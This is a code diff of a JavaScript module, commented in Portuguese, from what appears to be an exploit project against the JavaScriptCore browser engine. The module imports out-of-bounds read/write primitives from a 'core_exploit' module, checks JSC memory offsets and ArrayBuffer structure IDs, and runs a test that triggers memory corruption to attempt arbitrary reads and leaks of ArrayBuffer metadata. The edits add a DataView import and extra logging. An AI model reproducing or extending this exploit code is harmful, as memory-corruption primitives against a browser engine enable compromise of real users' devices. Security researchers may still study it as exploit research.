@@ -3,17 +3,19 @@ import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
+    oob_array_buffer_real,
+    oob_dataview_real, // <--- ADICIONADO AQUI
     oob_write_absolute,
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Irá ler o config.mjs corrigido
+import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
 
 const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
 let retype_getter_called_flag = false;
 let retype_leak_attempt_results = {};
 
+// Endereço baixo e inválido para o teste de crash controlado.
 const ENDERECO_INVALIDO_PARA_LEITURA_TESTE = new AdvancedInt64(0x1, 0x0);
 
 
@@ -53,12 +55,11 @@ export async function executeRetypeOOB_AB_Test() {
     if (!JSC_OFFSETS.ArrayBufferContents ||
         JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START === undefined ||
         JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START === undefined ||
-        !JSC_OFFSETS.JSCell || JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined || // Verificação adicionada para JSCell
+        !JSC_OFFSETS.JSCell || JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET === undefined ||
         !JSC_OFFSETS.ArrayBuffer ||
         !JSC_OFFSETS.ArrayBuffer.KnownStructureIDs ||
         JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID === undefined) {
         logS3("Offsets críticos (ArrayBufferContents, JSCell.STRUCTURE_POINTER_OFFSET, ou ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) não estão definidos corretamente em config.mjs. Abortando teste.", "critical", FNAME_TEST);
-        // Log mais detalhado para ajudar a identificar o problema exato
         console.error("Detalhes dos Offsets Ausentes/Incorretos em config.mjs:", {
             configProvided: !!JSC_OFFSETS,
             hasJSCell: !!JSC_OFFSETS?.JSCell,
@@ -73,7 +74,7 @@ export async function executeRetypeOOB_AB_Test() {
         return;
     }
     const arrayBufferStructureID = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
-    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) { // Este valor (2) é o que você validou [cite: 1]
+    if (arrayBufferStructureID !== 2 && arrayBufferStructureID !== 0x2) {
          logS3(`AVISO: ArrayBuffer_STRUCTURE_ID (${arrayBufferStructureID}) não é o valor comum (2) ou o valor validado. Verifique config.mjs.`, "warn", FNAME_TEST);
     }
 
@@ -85,12 +86,12 @@ export async function executeRetypeOOB_AB_Test() {
     const ppKey_val = 'toJSON';
 
     try {
-        await triggerOOB_primitive();
-        if (!oob_array_buffer_real || !oob_dataview_real) {
-            logS3("Falha ao inicializar o ambiente OOB. Abortando.", "critical", FNAME_TEST);
+        await triggerOOB_primitive(); // Configura oob_array_buffer_real e oob_dataview_real
+        if (!oob_array_buffer_real || !oob_dataview_real) { // Verificação para garantir que ambos foram definidos
+            logS3("Falha ao inicializar o ambiente OOB. oob_array_buffer_real ou oob_dataview_real não definidos. Abortando.", "critical", FNAME_TEST);
             return;
         }
-        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);
+        logS3(`Ambiente OOB inicializado. oob_array_buffer_real.byteLength: ${oob_array_buffer_real.byteLength}, oob_dataview_real.byteLength: ${oob_dataview_real.byteLength}`, "info", FNAME_TEST);
 
         const shadow_metadata_offset_in_oob_data = 0x0;
         const arbitrary_read_size = new AdvancedInt64(0x1000, 0x0);
@@ -171,7 +172,7 @@ export async function executeRetypeOOB_AB_Test() {
 
     } catch (mainError) {
         logS3(`Erro principal no teste executeRetypeOOB_AB_Test: ${mainError.message}`, "critical", FNAME_TEST);
-        console.error(mainError);
+        console.error(mainError); // Adicionado para ver o stack trace no console do navegador
         retype_leak_attempt_results.success = false;
         retype_leak_attempt_results.message = "Erro crítico no fluxo principal do teste.";
         retype_leak_attempt_results.error = String(mainError);
